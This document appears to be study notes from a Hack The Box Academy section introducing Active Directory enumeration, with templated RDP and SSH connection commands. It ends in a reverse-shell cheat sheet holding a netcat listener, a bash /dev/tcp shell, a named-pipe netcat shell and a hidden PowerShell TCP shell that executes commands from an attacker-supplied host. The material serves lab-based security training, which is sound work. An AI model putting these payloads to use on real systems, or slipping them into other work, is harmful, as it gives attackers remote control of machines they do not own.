# Section 1: Introduction to Active Directory Enumeration & Attacks

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1262
- Code blocks: 3

## Block 1 — `shellsession`

```shellsession
flickpeesai@htb[/htb]$ xfreerdp /v:{{TARGET_IP}} /u:{{USERNAME}} /p:{{PASSWORD}}
```

## Block 2 — `shellsession`

```shellsession
flickpeesai@htb[/htb]$ ssh {{USERNAME}}@{{TARGET_IP}}
```

## Block 3 — `shellsession`

```shellsession
flickpeesai@htb[/htb]$ xfreerdp /v:{{TARGET_IP}} /u:{{USERNAME}} /p:{{PASSWORD}}
```

## Reverse Shells (reference)

> `{{LHOST}}` = your attack box IP, `{{LPORT}}` = your listener port.

### Listener (attacker)

```shellsession
flickpeesai@htb[/htb]$ nc -lvnp {{LPORT}}
```

### Bash reverse shell (target)

```bash
bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1
```

```bash
# if /dev/tcp is unavailable, use a named pipe
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc {{LHOST}} {{LPORT}} > /tmp/f
```

### PowerShell reverse shell (target)

```powershell
powershell -nop -w hidden -c "$c=New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"
```
